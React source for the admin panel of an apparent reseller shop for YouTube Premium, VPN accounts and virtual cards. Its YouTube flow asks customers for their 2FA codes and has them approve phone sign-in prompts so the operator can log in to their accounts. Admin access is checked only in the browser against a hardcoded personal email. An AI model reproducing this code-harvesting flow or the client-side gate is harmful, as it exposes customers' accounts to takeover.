import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { getOrders, approveOrder, updateOrder } from '../utils/db';
import { FiCheckCircle, FiClock, FiShield, FiLock, FiAlertTriangle } from 'react-icons/fi';

const Admin = ({ user, authLoading }) => {
  const navigate = useNavigate();
  const [orders, setOrders] = useState([]);
  const [cardInputs, setCardInputs] = useState({});
  const [activeTab, setActiveTab] = useState('vpn'); // 'vpn' | 'card'

  const isAdmin = user && user.email === 'mithuchandra647@gmail.com';

  // Poll for new orders every 2 seconds to simulate realtime
  useEffect(() => {
    if (!isAdmin) return;
    const fetchOrders = async () => {
      const data = await getOrders();
      // Sort by newest first
      if (data && data.length > 0) {
        setOrders(data.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
      }
    };
    
    fetchOrders();
    const interval = setInterval(fetchOrders, 2000);
    return () => clearInterval(interval);
  }, [isAdmin]);

  const handleInputChange = (orderId, field, value) => {
    setCardInputs(prev => ({
      ...prev,
      [orderId]: {
        ...prev[orderId],
        [field]: value
      }
    }));
  };

  const handleApprove = async (orderId) => {
    const details = cardInputs[orderId];
    if (!details || !details.number || !details.cvv || !details.expiry) {
      alert("Please fill in all card details before approving!");
      return;
    }
    await approveOrder(orderId, details);
    alert("Order Approved! Customer screen will update automatically.");
    // Force a fetch right away to reflect changes
    const data = await getOrders();
    setOrders(data.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
  };

  const filteredOrders = orders.filter(order => {
    const isYouTube = order.product === 'YouTube Premium';
    const isVpn = !isYouTube && (order.orderType === 'vpn' || 
      (order.product && !order.product.toLowerCase().includes('mastercard') && 
      (order.product.toLowerCase().includes('vpn') || order.product.toLowerCase().includes('surfshark'))));
    
    if (activeTab === 'youtube') return isYouTube;
    if (activeTab === 'vpn') return isVpn;
    if (activeTab === 'card') return !isVpn && !isYouTube;
    return false;
  });

  const totalOrders = orders.length;
  const pendingOrders = orders.filter(o => o.status === 'pending').length;
  const approvedOrders = orders.filter(o => o.status === 'approved').length;

  if (authLoading) {
    return (
      <div className="page-content" style={{ paddingTop: '120px', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div className="glass-panel" style={{ padding: '40px', borderRadius: '24px', textAlign: 'center', color: '#fff' }}>
          Loading admin panel...
        </div>
      </div>
    );
  }

  // Access Restriction
  if (!isAdmin) {
    return (
      <div className="page-content" style={{ paddingTop: '120px', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
        <div style={{ position: 'absolute', top: '20%', left: '15%', width: '300px', height: '300px', background: '#ef4444', filter: 'blur(180px)', opacity: 0.15, zIndex: 0 }}></div>
        
        <div className="glass-panel" style={{ 
          width: '100%', maxWidth: '450px', padding: '45px', borderRadius: '24px', 
          position: 'relative', zIndex: 1, boxShadow: '0 25px 60px -12px rgba(0, 0, 0, 0.6)',
          textAlign: 'center'
        }}>
          <div style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', width: '65px', height: '65px', borderRadius: '18px', background: 'linear-gradient(135deg, #ef4444, #dc2626)', marginBottom: '20px', boxShadow: '0 10px 25px rgba(239, 68, 68, 0.3)' }}>
            <FiShield size={28} color="#fff" />
          </div>
          <h2 style={{ fontSize: '1.8rem', background: 'linear-gradient(135deg, #fff, #94a3b8)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: '15px' }}>
            Access Denied
          </h2>
          <p style={{ color: '#cbd5e1', fontSize: '1rem', marginBottom: '20px', lineHeight: '1.6' }}>
            You do not have permission to view this page. Only the administrator account <strong>mithuchandra647@gmail.com</strong> is allowed access.
          </p>
          <p style={{ color: '#64748b', fontSize: '0.9rem', marginBottom: '25px' }}>
            {user ? `Currently logged in as: ${user.email}` : 'You are not logged in.'}
          </p>
          <button onClick={() => navigate('/auth')} className="btn btn-primary" style={{ width: '100%', padding: '14px', borderRadius: '12px' }}>
            Log In as Admin
          </button>
        </div>
      </div>
    );
  }


  return (
    <div className="page-content" style={{ padding: '120px 0', minHeight: '100vh', background: 'var(--bg-color)' }}>
      <div className="container">
        <div style={{ display: 'flex', alignItems: 'center', gap: '15px', marginBottom: '30px', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '20px' }}>
          <FiShield style={{ fontSize: '2.5rem', color: '#10b981' }} />
          <h2 style={{ color: '#fff', fontSize: '2rem', margin: 0 }}>Admin Control Panel</h2>
        </div>

        {/* Analytics Dashboard */}
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '20px', marginBottom: '40px' }}>
          <div style={{ background: 'rgba(15, 23, 42, 0.8)', padding: '20px', borderRadius: '15px', border: '1px solid rgba(255,255,255,0.1)', textAlign: 'center' }}>
            <div style={{ color: '#94a3b8', fontSize: '1rem', marginBottom: '10px' }}>Total Orders</div>
            <div style={{ color: '#fff', fontSize: '2.5rem', fontWeight: 'bold' }}>{totalOrders}</div>
          </div>
          <div style={{ background: 'rgba(15, 23, 42, 0.8)', padding: '20px', borderRadius: '15px', border: '1px solid rgba(255,255,255,0.1)', textAlign: 'center' }}>
            <div style={{ color: '#94a3b8', fontSize: '1rem', marginBottom: '10px' }}>Pending Approvals</div>
            <div style={{ color: '#f59e0b', fontSize: '2.5rem', fontWeight: 'bold' }}>{pendingOrders}</div>
          </div>
          <div style={{ background: 'rgba(15, 23, 42, 0.8)', padding: '20px', borderRadius: '15px', border: '1px solid rgba(255,255,255,0.1)', textAlign: 'center' }}>
            <div style={{ color: '#94a3b8', fontSize: '1rem', marginBottom: '10px' }}>Completed Orders</div>
            <div style={{ color: '#10b981', fontSize: '2.5rem', fontWeight: 'bold' }}>{approvedOrders}</div>
          </div>
        </div>

        <div style={{ display: 'flex', gap: '15px', marginBottom: '30px' }}>
          <button onClick={() => setActiveTab('youtube')} className="btn" style={{ padding: '10px 20px', background: activeTab === 'youtube' ? 'linear-gradient(135deg, #ef4444, #dc2626)' : 'rgba(255,255,255,0.05)', color: '#fff', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>YouTube Orders</button>
          <button onClick={() => setActiveTab('vpn')} className="btn" style={{ padding: '10px 20px', background: activeTab === 'vpn' ? 'linear-gradient(135deg, #10b981, #059669)' : 'rgba(255,255,255,0.05)', color: '#fff', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>VPN Orders</button>
          <button onClick={() => setActiveTab('card')} className="btn" style={{ padding: '10px 20px', background: activeTab === 'card' ? 'linear-gradient(135deg, #0ea5e9, #0284c7)' : 'rgba(255,255,255,0.05)', color: '#fff', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>Card Orders</button>
        </div>

        <div style={{ display: 'grid', gap: '30px' }}>
          {filteredOrders.length === 0 ? (
            <p style={{ color: '#94a3b8', fontSize: '1.2rem' }}>No orders found in this category.</p>
          ) : (
            filteredOrders.map(order => (
              <div key={order.id} style={{ background: 'rgba(15, 23, 42, 0.8)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '15px', padding: '30px', display: 'flex', flexWrap: 'wrap', gap: '30px', position: 'relative', overflow: 'hidden' }}>
                
                {order.status === 'approved' && (
                  <div style={{ position: 'absolute', top: '15px', right: '15px', color: '#10b981', display: 'flex', alignItems: 'center', gap: '5px', fontWeight: 'bold' }}>
                    <FiCheckCircle /> APPROVED
                  </div>
                )}
                
                {/* Order Details */}
                <div style={{ flex: '1 1 300px' }}>
                  <h3 style={{ color: '#fff', marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <FiClock style={{ color: 'var(--secondary-color)' }}/> Order #{String(order.id).slice(-6)}
                  </h3>
                  <div style={{ color: '#cbd5e1', marginBottom: '8px' }}><strong>Email:</strong> {order.email}</div>
                  <div style={{ color: '#cbd5e1', marginBottom: '8px' }}><strong>Product:</strong> {order.product}</div>
                  <div style={{ color: '#cbd5e1', marginBottom: '8px' }}><strong>Payment:</strong> <span style={{textTransform:'capitalize'}}>{order.paymentMethod}</span></div>
                  <div style={{ color: '#0ea5e9', marginBottom: '8px', fontSize: '1.1rem' }}><strong>TrxID:</strong> {order.trxId}</div>
                  <div style={{ color: '#64748b', fontSize: '0.85rem', marginTop: '15px' }}>{new Date(order.createdAt).toLocaleString()}</div>
                </div>

                {/* Card / VPN Generator Box (Only show if pending) */}
                {order.status === 'pending' ? (
                  (() => {
                    const isYouTube = order.product === 'YouTube Premium';
                    const isVpnOrder = !isYouTube && (order.orderType === 'vpn' || 
                      (order.product && !order.product.toLowerCase().includes('mastercard') && 
                      (order.product.toLowerCase().includes('vpn') || order.product.toLowerCase().includes('surfshark'))));
                    
                    return (
                      <div style={{ flex: '1 1 350px', background: 'rgba(0,0,0,0.3)', padding: '20px', borderRadius: '10px', border: '1px solid rgba(255,255,255,0.05)' }}>
                        {isYouTube ? (
                          <>
                            <h4 style={{ color: '#cbd5e1', marginBottom: '15px', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '10px' }}>🔴 YouTube Premium 2FA & Activation</h4>
                            
                            <div style={{ background: 'rgba(239, 68, 68, 0.1)', padding: '15px', borderRadius: '10px', marginBottom: '15px', border: '1px solid rgba(239,68,68,0.2)' }}>
                              <strong style={{ color: '#ef4444', display: 'block', marginBottom: '10px' }}>Step 1: Ask User for 2FA / Approval</strong>
                              
                              <button 
                                onClick={async () => {
                                  await updateOrder(order.id, { askForCode: true, adminInstruction: null });
                                  alert('2FA Code input box is now visible to the user!');
                                }}
                                style={{ width: '100%', background: 'rgba(239, 68, 68, 0.2)', color: '#fff', padding: '10px', borderRadius: '5px', border: '1px solid rgba(239,68,68,0.5)', cursor: 'pointer', fontWeight: 'bold', marginBottom: '20px' }}
                              >
                                Request 2FA Code from User (Show Box)
                              </button>

                              <strong style={{ color: '#ef4444', display: 'block', marginBottom: '5px' }}>OR Send Instruction (e.g., Tap 85)</strong>
                              <input 
                                type="text" 
                                placeholder="e.g., Tap 85 on your phone" 
                                onChange={(e) => handleInputChange(order.id, 'adminInstruction', e.target.value)} 
                                style={{ width: '100%', padding: '10px', borderRadius: '5px', background: 'rgba(0,0,0,0.5)', border: '1px solid rgba(255,255,255,0.1)', color: '#fff', marginBottom: '10px', outline: 'none' }} 
                              />
                              <button 
                                onClick={async () => {
                                  const instruction = cardInputs[order.id]?.adminInstruction;
                                  if (!instruction) return alert('Please enter an instruction!');
                                  await updateOrder(order.id, { adminInstruction: instruction, askForCode: false, userConfirmedInstruction: false });
                                  alert('Instruction sent to user screen real-time!');
                                }}
                                style={{ width: '100%', background: 'rgba(255,255,255,0.1)', color: '#fff', padding: '10px', borderRadius: '5px', border: 'none', cursor: 'pointer', fontSize: '0.9rem' }}
                              >
                                Send Instruction to User Popup
                              </button>

                              {order.userConfirmedInstruction && (
                                <div style={{ marginTop: '10px', color: '#10b981', fontWeight: 'bold', textAlign: 'center', background: 'rgba(16,185,129,0.1)', padding: '5px', borderRadius: '5px' }}>
                                  ✅ User clicked 'Done' for the instruction!
                                </div>
                              )}
                            </div>

                            {order.twoFaCode && (
                              <div style={{ background: 'rgba(16, 185, 129, 0.1)', padding: '15px', borderRadius: '10px', marginBottom: '15px', border: '1px solid rgba(16,185,129,0.2)' }}>
                                <strong style={{ color: '#10b981', display: 'block', marginBottom: '5px' }}>User Provided Code:</strong>
                                <span style={{ fontSize: '1.5rem', fontWeight: 'bold', color: '#fff', letterSpacing: '2px' }}>{order.twoFaCode}</span>
                              </div>
                            )}

                            <div style={{ marginBottom: '20px' }}>
                              <strong style={{ color: '#cbd5e1', display: 'block', marginBottom: '10px' }}>Step 2: Login Status</strong>
                              <button 
                                onClick={async () => {
                                  await updateOrder(order.id, { loginStatus: 'done' });
                                  alert('Login Done notification sent to user!');
                                }}
                                style={{ background: '#3b82f6', color: '#fff', padding: '10px 20px', borderRadius: '5px', border: 'none', cursor: 'pointer', fontWeight: 'bold', width: '100%' }}
                              >
                                1-Click: Mark Login Done
                              </button>
                            </div>

                            <div style={{ borderTop: '1px solid rgba(255,255,255,0.1)', paddingTop: '15px' }}>
                              <strong style={{ color: '#cbd5e1', display: 'block', marginBottom: '10px' }}>Step 3: Complete Order</strong>
                              <textarea 
                                placeholder="Final message to user (e.g., Your Premium is activated!)..." 
                                onChange={(e) => handleInputChange(order.id, 'customMessage', e.target.value)} 
                                style={{ width: '100%', padding: '10px', borderRadius: '5px', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#fff', outline: 'none', resize: 'vertical', minHeight: '60px', marginBottom: '10px' }}
                              ></textarea>
                              <button 
                                onClick={async () => {
                                  let finalMessage = cardInputs[order.id]?.customMessage || "🎉 Your YouTube Premium has been successfully activated! Enjoy.";
                                  await approveOrder(order.id, { customMessage: finalMessage });
                                  alert("YouTube Order Approved!");
                                  const data = await getOrders();
                                  setOrders(data.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
                                }} 
                                style={{ width: '100%', padding: '12px', background: 'linear-gradient(135deg, #ef4444, #dc2626)', border: 'none', color: '#fff', fontWeight: 'bold', borderRadius: '8px', cursor: 'pointer' }}
                              >
                                Approve & Complete YouTube Order
                              </button>
                            </div>
                          </>
                        ) : isVpnOrder ? (
                          <>
                            <h4 style={{ color: '#cbd5e1', marginBottom: '15px', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '10px' }}>🔐 Assign VPN Details</h4>
                            <div style={{ marginBottom: '15px' }}>
                              <label style={{ display: 'block', color: '#94a3b8', fontSize: '0.9rem', marginBottom: '5px' }}>Email / Gmail</label>
                              <input type="email" placeholder="example@gmail.com" onChange={(e) => handleInputChange(order.id, 'gmail', e.target.value)} style={{ width: '100%', padding: '10px', borderRadius: '5px', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#fff', outline: 'none' }} />
                            </div>
                            <div style={{ marginBottom: '15px' }}>
                              <label style={{ display: 'block', color: '#94a3b8', fontSize: '0.9rem', marginBottom: '5px' }}>Username</label>
                              <input type="text" placeholder="user_vpn_name" onChange={(e) => handleInputChange(order.id, 'userName', e.target.value)} style={{ width: '100%', padding: '10px', borderRadius: '5px', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#fff', outline: 'none' }} />
                            </div>
                            <div style={{ marginBottom: '15px' }}>
                              <label style={{ display: 'block', color: '#94a3b8', fontSize: '0.9rem', marginBottom: '5px' }}>VPN Password</label>
                              <input type="text" placeholder="Password123" onChange={(e) => handleInputChange(order.id, 'vpnPass', e.target.value)} style={{ width: '100%', padding: '10px', borderRadius: '5px', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#fff', outline: 'none' }} />
                            </div>
                            <div style={{ marginBottom: '20px' }}>
                              <label style={{ display: 'block', color: '#94a3b8', fontSize: '0.9rem', marginBottom: '5px' }}>Message to User (Optional, Auto-generated if empty)</label>
                              <textarea placeholder="Leave empty for auto-generated nice message..." onChange={(e) => handleInputChange(order.id, 'customMessage', e.target.value)} style={{ width: '100%', padding: '10px', borderRadius: '5px', background: 'rgba(16, 185, 129, 0.05)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#fff', outline: 'none', resize: 'vertical', minHeight: '60px' }}></textarea>
                            </div>
                            <button onClick={async () => {
                              const details = cardInputs[order.id] || {};
                              if ((!details.gmail && !details.userName) || !details.vpnPass) {
                                alert("Please provide at least Gmail/Username and VPN Password!");
                                return;
                              }
                              
                              let finalMessage = details.customMessage;
                              if (!finalMessage || finalMessage.trim() === '') {
                                const name = details.userName || 'Customer';
                                finalMessage = `🎉 Hello <strong style="color: #fff; font-size: 1.1em;">${name}</strong>! Thank you for purchasing from us. Enjoy your premium secure access!`;
                              }

                              const finalDetails = { ...details, customMessage: finalMessage };
                              
                              await approveOrder(order.id, { vpnDetails: finalDetails });
                              alert("VPN Order Approved! Customer screen will update.");
                              const data = await getOrders();
                              setOrders(data.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
                            }} className="btn btn-primary" style={{ width: '100%', padding: '12px', background: 'linear-gradient(135deg, #10b981, #059669)', border: 'none', fontWeight: 'bold' }}>Approve & Send VPN</button>
                          </>
                        ) : (
                          <>
                            <h4 style={{ color: '#cbd5e1', marginBottom: '15px', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '10px' }}>💳 Assign Virtual Card</h4>
                            <div style={{ marginBottom: '15px' }}>
                              <label style={{ display: 'block', color: '#94a3b8', fontSize: '0.9rem', marginBottom: '5px' }}>Card Number (16 digits)</label>
                              <input type="text" placeholder="4111 2222 3333 4444" onChange={(e) => handleInputChange(order.id, 'number', e.target.value)} style={{ width: '100%', padding: '10px', borderRadius: '5px', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#fff', outline: 'none' }} />
                            </div>

                            <div style={{ display: 'flex', gap: '15px', marginBottom: '15px' }}>
                              <div style={{ flex: 1 }}>
                                <label style={{ display: 'block', color: '#94a3b8', fontSize: '0.9rem', marginBottom: '5px' }}>CVV</label>
                                <input type="text" placeholder="123" onChange={(e) => handleInputChange(order.id, 'cvv', e.target.value)} style={{ width: '100%', padding: '10px', borderRadius: '5px', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#fff', outline: 'none' }} />
                              </div>
                              <div style={{ flex: 1 }}>
                                <label style={{ display: 'block', color: '#94a3b8', fontSize: '0.9rem', marginBottom: '5px' }}>Expiry (MM/YY)</label>
                                <input type="text" placeholder="12/29" onChange={(e) => handleInputChange(order.id, 'expiry', e.target.value)} style={{ width: '100%', padding: '10px', borderRadius: '5px', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#fff', outline: 'none' }} />
                              </div>
                            </div>

                            <div style={{ marginBottom: '20px' }}>
                              <label style={{ display: 'block', color: '#94a3b8', fontSize: '0.9rem', marginBottom: '5px' }}>Message to User (Optional, Auto-generated if empty)</label>
                              <textarea placeholder="Leave empty for auto-generated nice message..." onChange={(e) => handleInputChange(order.id, 'customMessage', e.target.value)} style={{ width: '100%', padding: '10px', borderRadius: '5px', background: 'rgba(14, 165, 233, 0.05)', border: '1px solid rgba(14, 165, 233, 0.3)', color: '#fff', outline: 'none', resize: 'vertical', minHeight: '60px' }}></textarea>
                            </div>

                            <button onClick={async () => {
                              const details = cardInputs[order.id] || {};
                              if (!details.number || !details.cvv || !details.expiry) {
                                alert("Please fill in all card details before approving!");
                                return;
                              }
                              
                              let finalMessage = details.customMessage;
                              if (!finalMessage || finalMessage.trim() === '') {
                                const emailPrefix = order.email ? order.email.split('@')[0] : 'Customer';
                                finalMessage = `🎉 Hello <strong style="color: #fff; font-size: 1.1em;">${emailPrefix}</strong>! Your premium virtual card is ready. Enjoy your purchase!`;
                              }
                              
                              const finalDetails = { ...details, customMessage: finalMessage };
                              
                              await approveOrder(order.id, { cardDetails: finalDetails });
                              alert("Order Approved! Customer screen will update automatically.");
                              const data = await getOrders();
                              setOrders(data.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
                            }} className="btn btn-primary" style={{ width: '100%', padding: '12px', background: 'linear-gradient(135deg, #0ea5e9, #0284c7)', border: 'none', fontWeight: 'bold' }}>Approve & Send Card</button>
                          </>
                        )}
                      </div>
                    );
                  })()
                ) : (
                  <div style={{ flex: '1 1 350px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(16, 185, 129, 0.1)', borderRadius: '10px', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#10b981' }}>
                    {(order.orderType === 'vpn' || (order.product && (order.product.toLowerCase().includes('vpn') || order.product.toLowerCase().includes('surfshark')))) ? 'VPN Details delivered to customer!' : 'Card has been delivered to customer!'}
                  </div>
                )}
                
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
};

export default Admin;
